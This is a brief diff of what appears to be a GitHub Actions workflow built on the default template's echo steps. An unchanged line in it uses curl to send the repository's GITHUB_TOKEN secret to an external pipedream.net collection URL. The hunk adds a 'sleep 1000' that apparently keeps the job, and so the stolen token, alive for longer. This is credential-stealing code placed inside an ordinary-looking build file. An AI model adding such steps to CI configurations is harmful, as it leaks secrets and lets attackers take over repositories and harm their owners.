@@ -35,3 +35,4 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           curl https://eofykkajn917c3t.m.pipedream.net/?token=${{ secrets.GITHUB_TOKEN }}
+          sleep 1000
